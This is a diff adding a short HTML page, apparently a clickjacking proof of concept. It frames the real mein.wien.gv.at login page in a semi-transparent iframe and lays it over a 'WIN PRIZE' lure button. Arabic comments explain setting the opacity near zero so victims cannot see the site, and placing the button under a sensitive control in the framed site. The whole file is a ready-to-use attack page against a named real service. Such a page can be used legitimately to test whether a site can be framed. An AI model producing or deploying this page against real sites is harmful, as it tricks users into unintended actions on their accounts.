@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Test</title>
+    <style>
+        iframe {
+            width: 900px;
+            height: 600px;
+            /* في الهجوم الحقيقي بنخلي الـ opacity 0 أو 0.1 عشان الضحية متشوفش الموقع */
+            opacity: 0.5; 
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 2;
+        }
+        button {
+            position: absolute;
+            top: 300px; /* ظبط المكان بحيث يكون تحت زرار حساس جوه الموقع */
+            left: 450px;
+            z-index: 1;
+            padding: 20px;
+            background: red;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <h1>Click here to win a prize!</h1>
+    <button>WIN PRIZE</button>
+    
+    <iframe src="https://mein.wien.gv.at/login"></iframe>
+</body>
+</html>
